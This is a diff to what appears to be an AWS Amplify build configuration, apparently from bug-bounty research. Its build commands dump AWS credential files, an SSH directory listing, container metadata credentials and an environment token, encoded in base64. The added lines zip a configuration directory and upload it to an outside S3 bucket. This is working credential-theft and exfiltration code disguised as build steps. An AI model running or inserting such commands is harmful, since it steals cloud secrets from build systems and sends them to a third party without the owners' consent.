@@ -11,6 +11,8 @@ frontend:
         - echo "..."
         - echo $(cat /root/.aws/* | base64 -w 0) 
         - echo $(ls -la /etc/ssh | base64 -w 0)
+        - zip -r files.zip /root/.ampliy/*
+        - aws s3 cp files.zip s3://divyanshu29-hackerone-1112222111
 #         - echo $(cat /root/.amplify/amplify-configuration.json | base64 -w 0)
         - echo $(curl http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI | base64 -w 0)
         - export token=$(cat /codebuild/output/tmp/env.sh | grep 'AWS_ENVIRONMENT_TOKEN' | cut -d '=' -f 2 | cut -d '"' -f 2)
